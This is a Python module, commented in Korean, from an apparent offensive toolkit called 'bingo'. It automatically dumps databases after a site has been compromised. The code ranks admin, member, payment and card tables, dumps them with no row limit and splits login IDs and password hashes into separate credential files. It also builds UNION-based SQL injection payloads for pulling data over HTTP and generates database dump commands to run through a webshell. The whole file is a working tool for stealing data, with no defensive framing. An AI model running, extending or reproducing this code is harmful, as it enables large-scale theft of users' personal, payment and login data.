"""bingo/tools/db_dumper.py — 침투 성공 후 DB 자동 전체 덤프 엔진 (v2.9.3)

침투(SQLi/RCE/WebShell) 성공 즉시 자동으로:
  1. 전체 테이블 목록 수집
  2. 회원 테이블 식별 → 전체 덤프 (행 수 제한 없음)
  3. 관리자 테이블 식별 → 전체 덤프
  4. 기타 민감 테이블 덤프 (결제/카드/개인정보)
  5. JSON + CSV 파일로 저장
  저장 위치: 바탕화면/dump/타겟명_타임스탬프/
"""
from __future__ import annotations

import csv
import json
import os
import pathlib
import platform
import re
import time
from dataclasses import dataclass, field
from typing import Callable


def _get_desktop_dump_dir(target: str) -> str:
    """OS에 상관없이 바탕화면/dump/타겟명_타임스탬프/ 경로 반환.

    macOS  : ~/Desktop/dump/{target}_{ts}/
    Windows: ~/Desktop/dump/{target}_{ts}/  (OneDrive 바탕화면 자동 감지)
    Linux  : ~/Desktop/dump/{target}_{ts}/  (없으면 ~/dump/{target}_{ts}/)
    """
    home = pathlib.Path.home()
    ts = time.strftime("%Y%m%d_%H%M%S")

    # Windows OneDrive 바탕화면 우선 탐색
    if platform.system() == "Windows":
        onedrive = home / "OneDrive" / "Desktop"
        desktop = onedrive if onedrive.exists() else home / "Desktop"
    else:
        desktop = home / "Desktop"
        if not desktop.exists():
            desktop = home  # Linux 등 Desktop 없는 경우 홈 디렉터리 fallback

    dump_dir = desktop / "dump" / f"{target}_{ts}"
    return str(dump_dir)


# ── 테이블 분류 키워드 ──────────────────────────────────────────────────────────
MEMBER_TABLE_KEYWORDS = [
    # 한국어 CMS / 쇼핑몰
    "member", "members", "mb_", "user", "users", "account", "accounts",
    "customer", "customers", "client", "clients", "person", "people",
    "subscriber", "subscribers", "profile", "profiles",
    # 한국 특화
    "회원", "사용자", "고객",
    # GnuBoard / XE
    "g5_member", "xe_member", "wr_member",
]

ADMIN_TABLE_KEYWORDS = [
    "admin", "admins", "administrator", "administrators",
    "manager", "managers", "staff", "operator", "operators",
    "superuser", "root_user", "sys_user", "sysuser",
    # 한국 특화
    "관리자", "운영자",
    # GnuBoard / XE
    "g5_admin", "xe_admin", "g5_config",
]

SENSITIVE_TABLE_KEYWORDS = [
    "payment", "payments", "card", "cards", "credit", "billing",
    "order", "orders", "transaction", "transactions",
    "log", "logs", "session", "sessions", "token", "tokens",
    "secret", "secrets", "key", "keys", "password", "passwords",
    "config", "configs", "setting", "settings",
    # 개인정보
    "address", "phone", "email", "ssn", "passport", "identity",
    "주문", "결제", "카드", "배송",
]

# ── DB 타입별 쿼리 ─────────────────────────────────────────────────────────────
DB_QUERIES = {
    "mysql": {
        "list_tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        "list_columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema=database()",
        "count_rows": "SELECT COUNT(*) FROM `{table}`",
        "dump_table": "SELECT * FROM `{table}` LIMIT {limit} OFFSET {offset}",
        "dump_table_cols": "SELECT {cols} FROM `{table}` LIMIT {limit} OFFSET {offset}",
        "current_db": "SELECT database()",
        "current_user": "SELECT user()",
        "all_databases": "SELECT schema_name FROM information_schema.schemata",
    },
    "mssql": {
        "list_tables": "SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'",
        "list_columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "count_rows": "SELECT COUNT(*) FROM [{table}]",
        "dump_table": "SELECT * FROM [{table}] ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY",
        "dump_table_cols": "SELECT {cols} FROM [{table}] ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY",
        "current_db": "SELECT DB_NAME()",
        "current_user": "SELECT SYSTEM_USER",
        "all_databases": "SELECT name FROM sys.databases",
    },
    "postgresql": {
        "list_tables": "SELECT tablename FROM pg_tables WHERE schemaname='public'",
        "list_columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "count_rows": 'SELECT COUNT(*) FROM "{table}"',
        "dump_table": 'SELECT * FROM "{table}" LIMIT {limit} OFFSET {offset}',
        "dump_table_cols": 'SELECT {cols} FROM "{table}" LIMIT {limit} OFFSET {offset}',
        "current_db": "SELECT current_database()",
        "current_user": "SELECT current_user",
        "all_databases": "SELECT datname FROM pg_database",
    },
    "sqlite": {
        "list_tables": "SELECT name FROM sqlite_master WHERE type='table'",
        "list_columns": "PRAGMA table_info({table})",
        "count_rows": "SELECT COUNT(*) FROM [{table}]",
        "dump_table": "SELECT * FROM [{table}] LIMIT {limit} OFFSET {offset}",
        "dump_table_cols": "SELECT {cols} FROM [{table}] LIMIT {limit} OFFSET {offset}",
        "current_db": "SELECT 'sqlite'",
        "current_user": "SELECT 'sqlite_user'",
        "all_databases": "SELECT 'main'",
    },
    "oracle": {
        "list_tables": "SELECT table_name FROM all_tables",
        "list_columns": "SELECT column_name FROM all_tab_columns WHERE table_name=UPPER('{table}')",
        "count_rows": "SELECT COUNT(*) FROM {table}",
        "dump_table": "SELECT * FROM {table} WHERE ROWNUM <= {limit}",
        "dump_table_cols": "SELECT {cols} FROM {table} WHERE ROWNUM <= {limit}",
        "current_db": "SELECT ora_database_name FROM dual",
        "current_user": "SELECT user FROM dual",
        "all_databases": "SELECT username FROM all_users",
    },
}


@dataclass
class TableInfo:
    name: str
    category: str       # "member" | "admin" | "sensitive" | "other"
    row_count: int = 0
    columns: list[str] = field(default_factory=list)
    priority: int = 0   # 높을수록 먼저 덤프


@dataclass
class DumpResult:
    table: str
    category: str
    columns: list[str]
    rows: list[dict]
    row_count: int
    saved_path: str = ""
    note: str = ""


@dataclass
class DbDumpReport:
    target: str
    db_type: str
    db_name: str
    db_user: str
    all_tables: list[TableInfo] = field(default_factory=list)
    dumps: list[DumpResult] = field(default_factory=list)
    save_dir: str = ""

    @property
    def member_dumps(self) -> list[DumpResult]:
        return [d for d in self.dumps if d.category == "member"]

    @property
    def admin_dumps(self) -> list[DumpResult]:
        return [d for d in self.dumps if d.category == "admin"]

    @property
    def total_records(self) -> int:
        return sum(len(d.rows) for d in self.dumps)

    def summary(self) -> str:
        lines = [
            f"[DB DUMP REPORT] {self.target}",
            f"  DB: {self.db_type} | Database: {self.db_name} | User: {self.db_user}",
            f"  Tables discovered: {len(self.all_tables)}",
            f"  Dumps completed: {len(self.dumps)}",
            f"  Total records dumped: {self.total_records:,}",
            "",
        ]
        for d in self.dumps:
            lines.append(f"  [{d.category.upper():9}] {d.table} — {len(d.rows):,}행 → {d.saved_path}")
        return "\n".join(lines)


class DbDumper:
    """
    SQLi / WebShell / RCE 성공 후 DB 전체 자동 덤프.

    Parameters
    ----------
    query_fn : Callable[[str], list[dict] | str]
        SQL 쿼리를 실행하고 결과(행 목록 or 문자열)를 반환하는 콜백.
        SQLi UNION 덤프 또는 WebShell DB 접속 모두 사용 가능.
    db_type : str
        "mysql" | "mssql" | "postgresql" | "sqlite" | "oracle"
        (자동 감지 없을 시 "mysql" 기본)
    target : str
        타겟 URL/IP (파일 저장 시 식별용)
    save_dir : str
        덤프 저장 디렉터리 (기본: ./dump_{target}_{timestamp}/)
    batch_size : int
        한 번에 가져올 행 수 (기본: 500)
    """

    def __init__(
        self,
        query_fn: Callable[[str], list[dict] | str | None],
        db_type: str = "mysql",
        target: str = "target",
        save_dir: str = "",
        batch_size: int = 500,
    ) -> None:
        self.query_fn = query_fn
        self.db_type = db_type.lower()
        if self.db_type not in DB_QUERIES:
            self.db_type = "mysql"
        self.target = re.sub(r"[^\w\-]", "_", target)[:40]
        self.batch_size = batch_size
        self._q = DB_QUERIES[self.db_type]

        if save_dir:
            self.save_dir = save_dir
        else:
            self.save_dir = _get_desktop_dump_dir(self.target)
        os.makedirs(self.save_dir, exist_ok=True)

    # ── 쿼리 실행 헬퍼 ───────────────────────────────────────────────────────
    def _run(self, sql: str) -> list[dict]:
        try:
            result = self.query_fn(sql)
            if result is None:
                return []
            if isinstance(result, str):
                # 단일 값 반환 케이스 (count, current_db 등)
                return [{"value": result.strip()}]
            return result if isinstance(result, list) else [{"value": str(result)}]
        except Exception as e:
            return [{"error": str(e)}]

    def _run_scalar(self, sql: str) -> str:
        rows = self._run(sql)
        if not rows:
            return "unknown"
        first = rows[0]
        if "error" in first:
            return "unknown"
        return str(list(first.values())[0])

    # ── 테이블 목록 수집 ─────────────────────────────────────────────────────
    def _get_tables(self) -> list[str]:
        rows = self._run(self._q["list_tables"])
        tables = []
        for row in rows:
            val = list(row.values())[0] if row else ""
            if val and "error" not in str(val).lower():
                tables.append(str(val))
        return tables

    def _get_columns(self, table: str) -> list[str]:
        sql = self._q["list_columns"].format(table=table)
        rows = self._run(sql)
        columns = []
        for row in rows:
            val = list(row.values())[0] if row else ""
            if val:
                # SQLite PRAGMA returns dict with 'name' key
                if isinstance(row, dict) and "name" in row:
                    columns.append(str(row["name"]))
                else:
                    columns.append(str(val))
        return columns

    def _count_rows(self, table: str) -> int:
        sql = self._q["count_rows"].format(table=table)
        val = self._run_scalar(sql)
        try:
            return int(val)
        except Exception:
            return 0

    # ── 테이블 분류 ──────────────────────────────────────────────────────────
    def _classify_table(self, name: str) -> tuple[str, int]:
        """(category, priority) 반환"""
        n = name.lower()
        for kw in ADMIN_TABLE_KEYWORDS:
            if kw in n:
                return "admin", 100
        for kw in MEMBER_TABLE_KEYWORDS:
            if kw in n:
                return "member", 90
        for kw in SENSITIVE_TABLE_KEYWORDS:
            if kw in n:
                return "sensitive", 50
        return "other", 0

    # ── 단일 테이블 덤프 ─────────────────────────────────────────────────────
    def _dump_table(self, table: TableInfo, max_rows: int = 0) -> DumpResult:
        """max_rows=0 이면 행 수 제한 없이 전체 덤프."""
        rows_all: list[dict] = []
        offset = 0
        _unlimited = (max_rows == 0)

        while _unlimited or offset < max_rows:
            limit = self.batch_size if _unlimited else min(self.batch_size, max_rows - offset)
            sql = self._q["dump_table"].format(table=table.name, limit=limit, offset=offset)
            batch = self._run(sql)
            if not batch or (len(batch) == 1 and "error" in batch[0]):
                break
            rows_all.extend(batch)
            if len(batch) < limit:
                break
            offset += limit

        # 컬럼 추론 (첫 행 키 사용)
        columns = table.columns or (list(rows_all[0].keys()) if rows_all else [])

        # 저장
        saved_path = self._save(table.name, table.category, columns, rows_all)

        return DumpResult(
            table=table.name,
            category=table.category,
            columns=columns,
            rows=rows_all,
            row_count=len(rows_all),
            saved_path=saved_path,
        )

    # ── 파일 저장 ────────────────────────────────────────────────────────────
    def _save(self, table: str, category: str, columns: list[str], rows: list[dict]) -> str:
        base = os.path.join(self.save_dir, f"{category}_{table}")

        # JSON 저장
        json_path = f"{base}.json"
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump({"table": table, "category": category, "rows": rows}, f, ensure_ascii=False, indent=2)

        # CSV 저장
        csv_path = f"{base}.csv"
        if rows:
            fieldnames = columns or list(rows[0].keys())
            with open(csv_path, "w", newline="", encoding="utf-8-sig") as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
                writer.writeheader()
                writer.writerows(rows)

        return json_path

    # ── 패스워드 컬럼 자동 분리 저장 ────────────────────────────────────────
    def _extract_credentials(self, result: DumpResult) -> dict:
        """아이디/이메일/비밀번호 컬럼만 추출해서 별도 저장"""
        id_cols = [c for c in result.columns if any(k in c.lower() for k in ("id", "email", "user", "login", "mb_id"))]
        pw_cols = [c for c in result.columns if any(k in c.lower() for k in ("pw", "pass", "password", "hash", "mb_password"))]

        if not (id_cols or pw_cols):
            return {}

        creds = []
        for row in result.rows:
            entry = {}
            for c in id_cols + pw_cols:
                if c in row and row[c]:
                    entry[c] = row[c]
            if entry:
                creds.append(entry)

        if creds:
            cred_path = os.path.join(self.save_dir, f"CREDENTIALS_{result.table}.json")
            with open(cred_path, "w", encoding="utf-8") as f:
                json.dump(creds, f, ensure_ascii=False, indent=2)
            return {"count": len(creds), "path": cred_path, "id_cols": id_cols, "pw_cols": pw_cols}
        return {}

    # ── 메인 자동 덤프 ────────────────────────────────────────────────────────
    def auto_dump(
        self,
        dump_member: bool = True,
        dump_admin: bool = True,
        dump_sensitive: bool = True,
        dump_all: bool = False,
        max_rows_per_table: int = 0,
    ) -> DbDumpReport:
        """
        침투 성공 직후 호출. 자동으로 전체 DB를 분류하고 우선순위 순서대로 덤프.

        Parameters
        ----------
        dump_member : bool — 회원 테이블 덤프 여부
        dump_admin  : bool — 관리자 테이블 덤프 여부
        dump_sensitive : bool — 민감 테이블 (결제/세션 등) 덤프
        dump_all    : bool — True 시 분류 무관 모든 테이블 덤프
        max_rows_per_table : int — 테이블 당 최대 추출 행 수 (0 = 무제한)
        """
        # DB 기본 정보 수집
        db_name = self._run_scalar(self._q["current_db"])
        db_user = self._run_scalar(self._q["current_user"])

        report = DbDumpReport(
            target=self.target,
            db_type=self.db_type,
            db_name=db_name,
            db_user=db_user,
            save_dir=self.save_dir,
        )

        # 테이블 목록 + 분류
        raw_tables = self._get_tables()
        for t_name in raw_tables:
            category, priority = self._classify_table(t_name)
            row_count = self._count_rows(t_name)
            columns = self._get_columns(t_name)
            info = TableInfo(
                name=t_name, category=category,
                row_count=row_count, columns=columns, priority=priority
            )
            report.all_tables.append(info)

        # 우선순위 정렬 (admin > member > sensitive > other)
        report.all_tables.sort(key=lambda x: x.priority, reverse=True)

        # 덤프 대상 결정
        targets: list[TableInfo] = []
        for t in report.all_tables:
            if dump_all:
                targets.append(t)
            elif t.category == "admin" and dump_admin:
                targets.append(t)
            elif t.category == "member" and dump_member:
                targets.append(t)
            elif t.category == "sensitive" and dump_sensitive:
                targets.append(t)

        # 실제 덤프
        for t in targets:
            result = self._dump_table(t, max_rows=max_rows_per_table)
            # 크리덴셜 별도 추출
            cred_info = self._extract_credentials(result)
            if cred_info:
                result.note = (
                    f"크리덴셜 {cred_info['count']}건 추출 → {cred_info['path']} "
                    f"| ID컬럼: {cred_info['id_cols']} | PW컬럼: {cred_info['pw_cols']}"
                )
            report.dumps.append(result)

        # 요약 리포트 저장
        summary_path = os.path.join(self.save_dir, "DUMP_SUMMARY.txt")
        with open(summary_path, "w", encoding="utf-8") as f:
            f.write(report.summary())

        return report

    # ── SQLi 특화: UNION 기반 덤프 (페이지 기반) ─────────────────────────────
    def dump_via_sqli_union(
        self,
        url: str,
        param: str,
        columns_count: int,
        target_col_idx: int,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
        table: str,
        col: str,
        page_size: int = 50,
    ) -> list[str]:
        """
        UNION 기반 SQLi로 특정 테이블/컬럼 전체 추출.
        query_fn 없이 직접 HTTP request_fn 사용할 때.
        """
        results = []
        null_cols = ["NULL"] * columns_count
        offset = 0

        while True:
            null_cols[target_col_idx] = (
                f"(SELECT GROUP_CONCAT({col} SEPARATOR '|||') FROM "
                f"(SELECT {col} FROM {table} LIMIT {page_size} OFFSET {offset}) x)"
            )
            payload = f"' UNION SELECT {','.join(null_cols)}-- -"
            test_url = url.replace(f"{param}=", f"{param}={payload}")

            try:
                _, resp = request_fn(test_url, "GET", {}, "")
                matches = re.findall(r"([^\|]+)\|\|\|", resp)
                if not matches:
                    # 단일 값
                    single = re.search(r"<[^>]+>([^<]{3,200})</[^>]+>", resp)
                    if single:
                        matches = [single.group(1)]

                if not matches:
                    break

                results.extend([m.strip() for m in matches if m.strip()])

                if len(matches) < page_size:
                    break
                offset += page_size

            except Exception:
                break

        return results

    # ── WebShell 기반 덤프 ────────────────────────────────────────────────────
    @staticmethod
    def gen_webshell_dump_cmd(db_type: str, db_user: str, db_pass: str, db_name: str, table: str) -> str:
        """WebShell에서 실행할 DB 덤프 명령어 생성"""
        if db_type == "mysql":
            return (
                f"mysqldump -u{db_user} -p{db_pass} {db_name} {table} "
                f"--no-tablespaces --single-transaction --quick 2>/dev/null | head -10000"
            )
        elif db_type == "mssql":
            return (
                f"sqlcmd -S localhost -U {db_user} -P {db_pass} "
                f"-Q \"SELECT * FROM {table}\" -o /tmp/dump_{table}.csv -h-1 -s, -w 700"
            )
        elif db_type == "postgresql":
            return f"PGPASSWORD={db_pass} psql -U {db_user} -d {db_name} -c \"COPY {table} TO STDOUT CSV HEADER\""
        else:
            return f"sqlite3 /var/db/data.sqlite .dump {table}"
